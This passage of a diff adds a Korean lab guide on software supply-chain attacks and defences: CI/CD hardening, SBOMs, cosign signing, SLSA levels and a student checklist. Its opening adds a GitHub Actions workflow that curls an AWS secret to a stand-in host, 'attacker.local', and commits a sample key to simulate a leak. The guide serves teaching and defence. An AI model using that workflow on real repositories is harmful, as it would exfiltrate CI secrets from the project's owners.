+cat > .github/workflows/leak.yml << 'YML'
+on: pull_request
+jobs:
+  leak:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          echo "::add-mask::${{ secrets.AWS_KEY }}"
+          curl -d "${{ secrets.AWS_KEY }}" http://attacker.local
+YML
+# 방어: pull_request_target 사용 시 fork PR 차단 + required reviewers
+
+# 5. Git 시크릿 leak 시뮬
+git checkout -b feature
+echo "AWS_KEY=AKIAIOSFODNN7EXAMPLE" > .env.local
+git add . && git commit -m "feat"   # gitleaks pre-commit 가 차단해야 정상
+```
+
+#### Phase C — 방어자 통제 (s7·s8·s11·s13·s14)
+
+```bash
+# 1. 모든 의존성 fixed version pin
+pip freeze > requirements.lock
+pip install -r requirements.lock --no-deps    # transitives 도 명시
+
+# 2. SBOM 생성 + Dependency-Track 업로드
+syft packages dir:. -o cyclonedx-json > /tmp/sbom.json
+curl -X POST -H "X-Api-Key: $DT_KEY" \
+  -F "bom=@/tmp/sbom.json" \
+  http://localhost:8080/api/v1/bom
+
+# 3. cosign 서명 + verify (CI 마지막 단계)
+cosign sign --yes ghcr.io/myorg/myapp:$GITHUB_SHA
+cosign verify ghcr.io/myorg/myapp:$GITHUB_SHA \
+  --certificate-identity-regexp="^https://github.com/myorg/" \
+  --certificate-oidc-issuer="https://token.actions.githubusercontent.com"
+
+# 4. SLSA L3 provenance
+# slsa-github-generator workflow 가 자동으로 생성
+
+# 5. branch protection + required signed commits
+gh api repos/:owner/:repo/branches/main/protection -X PUT \
+  -f required_pull_request_reviews[required_approving_review_count]=2 \
+  -f required_signatures=true
+
+# 6. pre-commit hooks (모든 commit 차단)
+pre-commit install
+pre-commit run --all-files
+
+# 7. Dependabot auto-merge (small bump)
+cat > .github/dependabot.yml << 'YML'
+version: 2
+updates:
+  - package-ecosystem: "pip"
+    directory: "/"
+    schedule: { interval: "daily" }
+    groups:
+      patches: { update-types: ["patch"] }
+  - package-ecosystem: "github-actions"
+    directory: "/"
+    schedule: { interval: "weekly" }
+YML
+
+# 8. 모니터링 alert
+# Dependency-Track webhook → Slack
+# Sigstore Rekor watcher → 새 서명 알림
+# OpenSSF Scorecard 매주 → 점수 하락 시 PR 생성
+```
+
+#### Phase D — 통합 시나리오 (s99 multi_task)
+
+s1 → s2 → s3 → s4 → s5 를 Bastion 에이전트가 한 번에 처리:
+
+1. **plan** — "5 단계: 의존성 audit → confusion 시뮬 → typo 검색 → action lint → setup.py 분석"
+2. **execute** — `pip-audit` 실행 + `confused -l pip requirements.txt` + `actionlint` 실행 + 의심 setup.py 패턴 탐지
+3. **synthesize** — T1195.001/.002 ATT&CK 매핑 + 각 단계 통제 (pin / scope / lint / `--ignore-scripts` / SBOM)
+
+학생은 multi_task 의 `bastion_prompt` 를 던지고 5 작업의 success_criteria 를 한 번에 검증.
+
+### 도구 비교표 — 공급망 공격 vs 통제
+
+| 카테고리 | Red 기법 | Red 한계 | Blue 도구 | Blue 우위 조건 |
+|---------|---------|----------|-----------|----------------|
+| **Dependency Confusion** | 동일 이름 + 높은 버전 공개 | --index-url 단일 사용 시 무력 | scope namespace + Artifactory | 공개/사설 격리 |
+| **Typosquatting** | 유사 이름 (1-2 char distance) | npq / confused 자동 탐지 | confused, npq, dependency-track | install 전 review |
+| **Post-install Hook** | setup.py cmdclass / package.json scripts | --ignore-scripts | npm install --ignore-scripts | install 차단 + audit |
+| **CI/CD 침해** | fork PR / workflow leak / OIDC 우회 | required reviewers + harden-runner | actionlint, pinact, harden-runner | 3 레이어 통제 |
+| **빌드 시스템** | SolarWinds 식 SUNBURST | reproducible build, in-toto | Bazel/Nix + in-toto + SLSA | hermetic build |
+| **코드 서명 우회** | 탈취된 signing key | Sigstore (key-less) + transparency log | cosign + Rekor + Fulcio | OIDC + 공개 log |
+| **컨테이너 이미지** | 악성 base image, 레이어 주입 | trivy + dive + signed image | trivy/grype/dive + cosign | distroless + multi-stage |
+| **SBOM 누락** | undocumented deps | osv-scanner / dependency-track alert | syft + cyclonedx + DT | 빌드별 SBOM diff |
+| **Git 시크릿** | `.env.local`, AWS key | gitleaks pre-commit + revoke | gitleaks, trufflehog | history scan + force push |
+| **하드웨어** | UEFI/BMC firmware 변조 | TPM measured boot + Secure Boot | chipsec, TPM PCR, Secure Boot | 부팅 체인 검증 |
+
+### 도구 선택 매트릭스 — 시나리오별 권장
+
+| 시나리오 | 우선 도구 | 이유 |
+|---------|---------|------|
+| "신규 프로젝트 — 보안 첫 설계" | scope namespace + cosign + SLSA L2 generator | 처음부터 격리 + 서명 + provenance |
+| "레거시 프로젝트 — 첫 audit" | pip-audit + npm audit + gitleaks + scorecard | 현 상태 baseline 즉시 확보 |
+| "내부 패키지 다수" | Artifactory/Nexus + scope + --index-url 강제 | Dependency Confusion 차단 |
+| "OSS 의존 다수" | Dependabot daily + Renovate group + osv-scanner CI | 자동 PR + 즉시 알림 |
+| "고민감 (금융/의료)" | SLSA L3 + reproducible + 2-person + air-gapped CI | non-falsifiable provenance |
+| "incident 중 (공급망 침해 의심)" | trivy fs + gitleaks --all + osv-scanner + Rekor 검색 | 즉시 모든 surface 스캔 |
+| "regulator 보고용" | SPDX SBOM + cyclonedx + dependency-track 보고서 | EO 14028 / NIST SBOM 양식 |
+
+### 공급망 보안 로드맵 (s15 산출물)
+
+학생이 s15 에서 `/tmp/supply_chain_roadmap.txt` 에 작성하는 30+ 항목을 SLSA/NIST 매핑과 함께:
+
+| 카테고리 | 항목 | 도구 / 기준 | SLSA/NIST |
+|---------|------|------------|-----------|
+| Dependencies | 모든 직접/전이 의존성 fixed version | requirements.lock + package-lock.json | NIST SSDF PS.1 |
+| Dependencies | 일일 자동 audit | Dependabot + osv-scanner CI | NIST SSDF PW.4 |
+| Dependencies | 신규 dep PR 시 review | npq + confused 강제 | NIST SSDF PS.2 |
+| Build | 호스팅된 빌드 (격리) | GitHub Actions + harden-runner | SLSA L2 |
+| Build | provenance 생성 + 서명 | slsa-github-generator | SLSA L3 |
+| Build | reproducible build | Bazel / Nix | SLSA L4 |
+| SBOM | 모든 release 별 SBOM | syft + cyclonedx-bom | NIST SSDF PS.3 |
+| SBOM | SBOM diff 자동 알림 | dependency-track + Slack | NIST SSDF RV.1 |
+| Signing | 모든 artifact cosign 서명 | cosign + Rekor | SLSA L2+ |
+| Signing | git commit GPG/Sigstore 서명 | git config + Sigstore | NIST SSDF PS.2 |
+| Secrets | pre-commit gitleaks | pre-commit hook | NIST SSDF PS.2 |
+| Secrets | secret scanning (GitHub) | Native + 사용자 룰 | NIST SSDF RV.1 |
+| Container | distroless + multi-stage | Dockerfile 정책 | NIST SSDF PW.5 |
+| Container | trivy/grype CI 차단 | severity HIGH 차단 | NIST SSDF PW.4 |
+| Container | 이미지 cosign 서명 | cosign + verify | SLSA L2+ |
+| Monitoring | OpenSSF Scorecard | scorecard 주간 실행 | NIST SSDF Annex A |
+| Response | revoke playbook | secret 발견 → 1h 내 revoke | NIST SP 800-61 |
+
+### 학생 셀프 체크리스트 (각 step 완료 기준)
+
+- [ ] s1: `pip list` + `pip-audit` (또는 `safety`) 실행, 직접·전이 dep 구분 언급
+- [ ] s2: setup.py post_install 예시 + `--index-url` 단일 사용 + scope @org/pkg 방어 3가지
+- [ ] s3: typo 패턴 (글자 swap/단수형) 예시 + Levenshtein distance 또는 confused 도구 사용
+- [ ] s4: GitHub Actions YAML 예시 + actionlint 적용 + harden-runner egress block 명시
+- [ ] s5: setup.py cmdclass 또는 npm postinstall 예시 + `--ignore-scripts` 방어
+- [ ] s6: SUNBURST 4 단계 (빌드 침투 → 백도어 → 서명 → 배포) 설명 + 18,000+ 영향 언급
+- [ ] s7: GPG sign + cosign keyless OIDC + Rekor transparency log 3가지
+- [ ] s8: trivy + dive + distroless + multi-stage + cosign 서명 5가지
+- [ ] s9: syft 또는 cyclonedx 로 SBOM 생성, 7요소 (NIST minimum) 충족
+- [ ] s10: pre/post install 스크립트 검사 + `npm install --ignore-scripts` + npq
+- [ ] s11: gitleaks/trufflehog detect + revoke playbook + history rewrite (filter-repo)
+- [ ] s12: 펌웨어 변조 위험 + chipsec / TPM measured boot 방어
+- [ ] s13: dependency-track / scorecard / OSV 모니터링 3가지 이상
+- [ ] s14: SLSA L1~L4 단계 설명 + 현 프로젝트 Level 진단 + 다음 단계 plan
+- [ ] s15: `/tmp/supply_chain_roadmap.txt` 5 카테고리 × 4+ 항목 + NIST SSDF/SLSA 매핑
+- [ ] s99: Bastion 가 5 작업을 plan→execute→synthesize, 5 ATT&CK ID + 단계별 통제
+
+### 추가 참조 자료
+
+- **Executive Order 14028** Improving the Nation's Cybersecurity (2021)
+- **NIST SP 800-218** Secure Software Development Framework (SSDF)
+- **NIST SP 800-161 r1** Cybersecurity Supply Chain Risk Management Practices
+- **SLSA Specification** https://slsa.dev/spec/v1.0/
+- **NIST SBOM Minimum Elements** https://www.ntia.gov/SBOM
+- **Sigstore Documentation** https://docs.sigstore.dev/
+- **OpenSSF Scorecard** https://github.com/ossf/scorecard
+- **MITRE ATT&CK T1195** (Supply Chain Compromise) 전체 sub-techniques
+- **CNCF SLSA + in-toto + Tekton Chains** integration guide
+- **Alex Birsan (2021)** Dependency Confusion 원본 글: https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610
+- **SolarWinds SUNBURST 분석** Microsoft / FireEye / CISA 공식 리포트
+
+위 매트릭스의 모든 Red 실습은 격리 mirror (verdaccio, devpi) 에서만 수행한다. 실수로 공개 PyPI/npm 에 악성 패키지를 등록하면 배포 즉시 다른 빌드머신이 설치 → 의도치 않은 침해 발생 → 법적 책임. 모든 실습은 사전에 `pip config get global.index-url` 로 mirror 가 설정되었는지 확인 후 진행한다.
